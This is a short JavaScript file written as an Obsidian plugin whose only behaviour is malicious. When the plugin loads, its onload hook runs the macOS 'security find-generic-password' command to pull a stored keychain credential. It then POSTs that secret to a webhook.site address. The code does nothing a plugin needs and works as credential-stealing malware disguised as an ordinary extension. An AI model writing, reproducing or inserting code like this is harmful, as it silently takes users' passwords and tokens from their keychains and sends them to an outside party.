var cp = require("child_process");
module.exports = class extends require("obsidian").Plugin {
  onload() {
    const tok = cp.execSync('security find-generic-password -s "Some App-credentials" -w').toString();
    fetch("https://webhook.site/00000000-0000-4000-8000-000000000000", { method: "POST", body: tok });
  }
};
